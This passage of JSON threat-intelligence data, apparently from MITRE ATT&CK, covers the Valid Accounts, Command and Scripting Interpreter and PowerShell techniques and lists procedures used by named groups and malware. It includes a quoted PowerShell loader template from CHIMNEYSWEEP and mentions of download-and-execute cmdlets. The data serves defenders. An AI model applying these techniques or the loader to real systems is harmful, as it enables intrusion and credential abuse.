"During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet attempts to access network resources with a domain account\u2019s credentials."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used stolen domain admin accounts to compromise additional hosts."}, {"id": "G0028", "name": "Threat Group-1314", "description": "Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used compromised domain admin credentials to mount local network shares."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used compromised domain accounts to authenticate to devices on compromised networks."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network."}]}, {"name": "Local Accounts", "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.", "detailed_description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.", "id": "T1078.003", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used legitimate local admin account credentials."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use known credentials to run commands and spawn processes as a local user account."}, {"id": "S0367", "name": "Emotet", "description": "Emotet can brute force a local admin password, then use it to facilitate lateral movement."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has moved laterally using the Local Administrator account."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used compromised credentials for access as SYSTEM on Exchange servers."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya can use valid credentials with PsExec or wmic to spread itself to remote systems."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation."}, {"id": "G1040", "name": "Play", "description": "Play has used valid  local accounts to gain initial access."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has created admin accounts on a compromised host."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used known administrator account credentials to execute the backdoor directly."}, {"id": "G0010", "name": "Turla", "description": "Turla has abused local accounts that have the same password across the victim\u2019s network."}, {"id": "S0221", "name": "Umbreon", "description": "Umbreon creates valid local users to provide access to the system."}]}, {"name": "Cloud Accounts", "description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. ", "detailed_description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication.\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods.", "id": "T1078.004", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes."}, {"id": "G0016", "name": "APT29", "description": "APT29 has gained access to a global administrator account in Azure AD and has used Service Principal credentials in Exchange."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints."}, {"id": "G1023", "name": "APT5", "description": "APT5 has accessed Microsoft M365 cloud environments using stolen credentials. "}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider leveraged compromised credentials from victim users  to authenticate to Azure tenants."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used compromised credentials to sign into victims\u2019 Microsoft 365 accounts."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used compromised credentials to access cloud assets within a target organization."}, {"id": "S1091", "name": "Pacu", "description": "Pacu leverages valid cloud accounts to perform most of its operations."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can use stolen service account tokens to perform its operations."}, {"id": "S0684", "name": "ROADTools", "description": "ROADTools leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal."}]}]}]}, {"name": "Execution", "description": "The adversary is trying to run malicious code.Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "id": "TA0002", "techniques": [{"name": "Cloud Administration Command", "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents.", "detailed_description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. \nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a Trusted Relationship to execute commands in connected virtual machines.", "id": "T1651", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can execute commands on Azure virtual machines using the VM agent."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can run commands on EC2 instances using AWS Systems Manager Run Command."}], "sub_techniques": []}, {"name": "Command and Scripting Interpreter", "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.", "detailed_description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.", "id": "T1059", "examples": [{"id": "G0073", "name": "APT19", "description": "APT19 downloaded and launched code within a SCT file."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used COM scriptlets to download Cobalt Strike beacons."}, {"id": "G0067", "name": "APT37", "description": "APT37 has used Ruby scripts to execute payloads."}, {"id": "G0087", "name": "APT39", "description": "APT39 has utilized custom scripts to perform internal reconnaissance."}, {"id": "S0234", "name": "Bandook", "description": "Bandook can support commands to execute Java-based payloads."}, {"id": "S0486", "name": "Bonadan", "description": "Bonadan can create bind and reverse shells on the infected system."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK is capable of performing remote command execution."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used Perl scripts to enable the deployment of the THINSPOOL shell script dropper and for enumerating host data."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can execute various types of scripts on the victim\u2019s machine."}, {"id": "S0695", "name": "Donut", "description": "Donut can generate shellcode outputs that execute via Ruby."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used the command line for execution."}, {"id": "S0363", "name": "Empire", "description": "Empire uses a command-line interface to interact with systems."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 used SQL scripts to help perform tasks on the victim's machine."}, {"id": "S0618", "name": "FIVEHANDS", "description": "FIVEHANDS can receive a command line argument to limit file encryption to specified directories."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used a Perl reverse shell to communicate with C2."}, {"id": "S0460", "name": "Get2", "description": "Get2 has the ability to run executables with command-line arguments."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT is able to open a remote shell to execute commands."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts."}, {"id": "G0004", "name": "Ke3chang", "description": "Malware used by Ke3chang can run commands on the command-line interface."}, {"id": "S0487", "name": "Kessel", "description": "Kessel can create a reverse shell between the infected host and a specified system."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka is capable of providing Meterpreter shell access."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used various types of scripting for execution."}, {"id": "C0005", "name": "Operation Spalax", "description": "For Operation Spalax, the threat actors used Nullsoft Scriptable Install System (NSIS) scripts to install malware."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell has the ability to create reverse shells with Perl scripts."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin variants can be delivered via highly obfuscated Windows Script Files (WSF) for initial execution."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear has used the Windows Script Host (wscript) to execute intermediate files written to victim machines."}, {"id": "S1110", "name": "SLIGHTPULSE", "description": "SLIGHTPULSE contains functionality to execute arbitrary commands passed to it."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp uses Perl scripts."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware uses WMI to script data collection and command execution on the victim."}, {"id": "S1154", "name": "VersaMem", "description": "VersaMem was delivered as a Java Archive (JAR) that runs by attaching itself to the Apache Tomcat Java servlet and web server."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has used a simple remote shell tool that will call back to the C2 server and wait for commands."}, {"id": "G0124", "name": "Windigo", "description": "Windigo has used a Perl script for information gathering."}, {"id": "S0219", "name": "WINERACK", "description": "WINERACK can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern used XLM 4.0 macros for initial code execution for malicious document files."}, {"id": "S1151", "name": "ZeroCleare", "description": "ZeroCleare can receive command line arguments from an operator to corrupt the file system using the RawDisk driver."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda can launch remote scripts on the victim\u2019s machine."}], "sub_techniques": [{"name": "PowerShell", "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).", "detailed_description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).", "id": "T1059.001", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses."}, {"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy."}, {"id": "S0677", "name": "AADInternals", "description": "AADInternals is written and executed via PowerShell."}, {"id": "S1129", "name": "Akira", "description": "Akira will execute PowerShell commands to delete system volume shadow copies."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has the ability to execute its payload via PowerShell."}, {"id": "G0073", "name": "APT19", "description": "APT19 used PowerShell commands to execute payloads."}, {"id": "G0007", "name": "APT28", "description": "APT28 downloads and executes PowerShell scripts and performs PowerShell commands."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke."}, {"id": "G0022", "name": "APT3", "description": "APT3 has used PowerShell on victim systems to download and run payloads after exploitation."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution."}, {"id": "G0064", "name": "APT33", "description": "APT33 has utilized PowerShell to download files from the C2 server and run various scripts. "}, {"id": "G0082", "name": "APT38", "description": "APT38 has used PowerShell to execute commands and other operational tasks."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used PowerShell to execute malicious code."}, {"id": "G0096", "name": "APT41", "description": "APT41 leveraged PowerShell to deploy malware families in victims\u2019 environments."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used PowerShell to accomplish tasks within targeted environments."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has downloaded additional scripts and executed Base64 encoded commands in PowerShell."}, {"id": "S0129", "name": "AutoIt backdoor", "description": "AutoIt backdoor downloads a PowerShell script that decodes to a typical shellcode loader."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can utilize powershell.exe to execute commands on a compromised host."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has used PowerShell loaders as part of execution."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can execute a PowerShell script received from C2."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta has used PowerShell scripts for discovery and to execute files over the network."}, {"id": "S0521", "name": "BloodHound", "description": "BloodHound can use PowerShell to pull Active Directory information from the target environment."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used PowerShell reverse TCP shells to issue interactive commands over a network connection."}, {"id": "S0360", "name": "BONDUPDATER", "description": "BONDUPDATER is written in PowerShell."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used PowerShell for execution."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can use PowerShell for execution."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors used encoded PowerShell scripts for execution."}, {"id": "C0021", "name": "C0021", "description": "During C0021, the threat actors used obfuscated PowerShell to extract an encoded payload from within an .LNK file."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used PowerShell to perform timestomping."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can use PowerShell for payload execution and C2 communication."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can invoke the PowerShell command             [Reflection.Assembly]::LoadFile(\\\"%s\\\")\\n$i=\\\"\\\"\\n$r=[%s]::%s(\\\"%s\\\",[ref] $i)\\necho $r,$i\\n to execute secondary payloads."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used PowerShell to communicate with C2, download files, and execute reconnaissance commands."}, {"id": "S0660", "name": "Clambling", "description": "The Clambling dropper can use PowerShell to download the malware."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used powershell.exe to download and execute scripts."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can execute a payload on a remote host with PowerShell. This technique does not write any data to disk. Cobalt Strike can also use PowerSploit and other scripting frameworks to perform execution."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has used PowerShell to load itself every time a user logs in to the system. ComRAT can execute PowerShell scripts loaded into memory or from the file system."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has used PowerShell to execute malicious files and payloads."}, {"id": "S0591", "name": "ConnectWise", "description": "ConnectWise can be used to execute PowerShell commands on target machines."}, {"id": "G0052", "name": "CopyKittens", "description": "CopyKittens has used PowerShell Empire."}, {"id": "S1155", "name": "Covenant", "description": "Covenant can create PowerShell-based launchers for Grunt installation."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can execute PowerShell commands via WMI."}, {"id": "S1023", "name": "CreepyDrive", "description": "CreepyDrive can use Powershell for execution, including the cmdlets Invoke-WebRequest and Invoke-Expression."}, {"id": "S1024", "name": "CreepySnail", "description": "CreepySnail can use PowerShell for execution, including the cmdlets Invoke-WebRequst and Invoke-Expression."}, {"id": "S0625", "name": "Cuba", "description": "Cuba has been dropped onto systems and used for lateral movement via obfuscated PowerShell scripts."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has leveraged PowerShell scripts for initial process execution and data gathering in victim environments."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly used PowerShell to download and execute remote-hosted files on victim systems."}, {"id": "G0079", "name": "DarkHydrus", "description": "DarkHydrus leveraged PowerShell to download and execute additional scripts for execution."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya used PowerShell to create shellcode loaders."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can execute PowerShell commands and has used PowerShell to execute a keylogger."}, {"id": "G0009", "name": "Deep Panda", "description": "Deep Panda has used PowerShell scripts to download and execute programs in memory, without writing to disk."}, {"id": "S0354", "name": "Denis", "description": "Denis has a version written in PowerShell."}, {"id": "S0695", "name": "Donut", "description": "Donut can generate shellcode outputs that execute via PowerShell."}, {"id": "S0186", "name": "DownPaper", "description": "DownPaper uses PowerShell for execution."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used PowerShell scripts for execution."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used PowerShell to execute commands."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used an encoded PowerShell command by a service created by Cobalt Strike for lateral movement."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used PowerShell commands to gather information from compromised systems,  such as email servers."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has used Powershell to retrieve the malicious payload and download additional resources like Mimikatz. "}, {"id": "S0363", "name": "Empire", "description": "Empire leverages PowerShell for the majority of its client-side agent tasks. Empire also contains the ability to conduct PowerShell remoting with the Invoke-PSRemoting module."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke has the ability to execute PowerShell scripts."}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious can use PowerShell scripts for execution."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 uses PowerShell for execution as well as PowerShell Empire to establish persistence."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used PowerShell commands to obtain DNS data from a compromised network."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 used a PowerShell script to launch shellcode that retrieved an additional payload."}, {"id": "G0061", "name": "FIN8", "description": "FIN8's malicious spearphishing payloads are executed as PowerShell. FIN8 has also used PowerShell for lateral movement and credential access."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy has used PowerShell to execute commands."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used PowerShell scripts to access credential data."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used PowerShell to run a series of Base64-encoded commands that acted as a stager and enumerated hosts."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines."}, {"id": "G0084", "name": "Gallmaker", "description": "Gallmaker used PowerShell to download additional payloads and for execution."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used obfuscated PowerShell scripts for staging."}, {"id": "S1117", "name": "GLASSTOKEN", "description": "GLASSTOKEN can use PowerShell for command execution."}, {"id": "G0115", "name": "GOLD SOUTHFIELD", "description": "GOLD SOUTHFIELD has staged and executed PowerShell scripts on compromised hosts."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can use an encoded PowerShell stager to write to the Registry for persistence."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim\u2019s machine."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON has used PowerShell to execute the Meterpreter downloader TinyMet."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used the Exchange Power Shell module Set-OabVirtualDirectoryPowerShell to export mailbox data."}, {"id": "S0151", "name": "HALFBAKED", "description": "HALFBAKED can execute PowerShell scripts."}, {"id": "S0037", "name": "HAMMERTOSS", "description": "HAMMERTOSS is known to use PowerShell."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has used PowerShell to execute commands."}, {"id": "S0170", "name": "Helminth", "description": "One version of Helminth uses a PowerShell script."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used PowerShell-based tools and scripts for discovery and collection on compromised hosts."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used PowerShell cmdlets New-MailboxSearch and Get-Recipient for discovery."}, {"id": "G0100", "name": "Inception", "description": "Inception has used PowerShell to execute malicious commands and payloads."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used PowerShell Empire for execution of malware."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper can run arbitrary PowerShell commands passed to it."}, {"id": "S0389", "name": "JCry", "description": "JCry has used PowerShell to execute payloads."}, {"id": "S0648", "name": "JSS Loader", "description": "JSS Loader has the ability to download and execute PowerShell scripts."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy uses PowerShell commands to download and execute payloads."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can execute PowerShell commands on the victim's machine."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has executed a variety of PowerShell scripts including Invoke-Mimikatz."}, {"id": "S0250", "name": "Koadic", "description": "Koadic has used PowerShell to establish persistence."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has used PowerShell commands to download additional files."}, {"id": "S0356", "name": "KONNI", "description": "KONNI used PowerShell to download and execute a specific 64-bit version of the malware."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used PowerShell to execute commands and malicious code."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used PowerShell scripts to execute malicious code."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used PowerShell for execution."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can use a PowerShell script to execute commands."}, {"id": "S0681", "name": "Lizar", "description": "Lizar has used PowerShell scripts."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has used PowerShell commands embedded inside batch scripts."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb has the ability to run shell commands via PowerShell."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can execute PowerShell commands on a compromised machine."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used PowerShell for execution and privilege escalation."}, {"id": "G0045", "name": "menuPass", "description": "menuPass uses PowerSploit to inject shellcode into PowerShell."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can use PowerShell commands to disable the network adapters on a victim machines."}, {"id": "S0553", "name": "MoleNet", "description": "MoleNet can use PowerShell to set persistence."}, {"id": "G0021", "name": "Molerats", "description": "Molerats used PowerShell implants on target machines."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito can launch PowerShell Scripts."}, {"id": "G1019", "name": "MoustachedBouncer", "description": "MoustachedBouncer has used plugins to execute PowerShell scripts."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used PowerShell for execution."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used malicious PowerShell scripts to enable execution."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker has been written in PowerShell and executed directly in memory, avoiding detection."}, {"id": "S0198", "name": "NETWIRE", "description": "The NETWIRE binary has been executed via PowerShell script."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has executed PowerShell commands via auto-run registry key persistence."}, {"id": "G0133", "name": "Nomadic Octopus", "description": "Nomadic Octopus has used PowerShell for execution."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used PowerShell on compromised systems."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D uses PowerShell scripts."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork used PowerSploit to download payloads, run a reverse shell, and execute malware on the victim's machine."}, {"id": "C0036", "name": "Pikabot Distribution February 2024", "description": "Pikabot Distribution February 2024 passed execution from obfuscated JavaScript files to PowerShell scripts to download and install Pikabot."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has used a PowerShell script to install a shim database."}, {"id": "G1040", "name": "Play", "description": "Play has used Base64-encoded PowerShell scripts to disable Microsoft Defender."}, {"id": "G0033", "name": "Poseidon Group", "description": "The Poseidon Group's Information Gathering Tool (IGT) includes PowerShell components."}, {"id": "S0150", "name": "POSHSPY", "description": "POSHSPY uses PowerShell to execute various commands, one to execute its payload."}, {"id": "S1012", "name": "PowerLess", "description": "PowerLess is written in and executed via PowerShell without using powershell.exe."}, {"id": "S0685", "name": "PowerPunch", "description": "PowerPunch has the ability to execute through PowerShell."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower is a backdoor written in PowerShell."}, {"id": "S0145", "name": "POWERSOURCE", "description": "POWERSOURCE is a PowerShell backdoor."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit modules are written in and executed via PowerShell."}, {"id": "S0393", "name": "PowerStallion", "description": "PowerStallion uses PowerShell loops to iteratively check for available commands in its OneDrive C2 server."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS uses PowerShell for obfuscation and execution."}, {"id": "S0371", "name": "POWERTON", "description": "POWERTON is written in PowerShell."}, {"id": "S1046", "name": "PowGoop", "description": "PowGoop has the ability to use PowerShell scripts to execute commands."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER is written in PowerShell."}, {"id": "S1058", "name": "Prestige", "description": "Prestige can use PowerShell for payload execution on targeted systems."}, {"id": "S0613", "name": "PS1", "description": "PS1 can utilize a PowerShell loader."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY has used PowerShell scripts."}, {"id": "S0192", "name": "Pupy", "description": "Pupy has a module for loading and executing PowerShell scripts."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt has attempted to execute with PowerShell."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has used Powershell scripts to deploy its ransomware."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use PowerShell to download and execute payloads."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT uses PowerShell scripts for execution."}, {"id": "S0241", "name": "RATANKBA", "description": "There is a variant of RATANKBA that uses a PowerShell script instead of the traditional PE form."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used PowerShell to execute commands and to download malware."}, {"id": "S0511", "name": "RegDuke", "description": "RegDuke can extract and execute PowerShell scripts from C2 communications."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT uses the PowerShell command Reflection.Assembly to load itself into memory to aid in execution."}, {"id": "S0496", "name": "REvil", "description": "REvil has used PowerShell 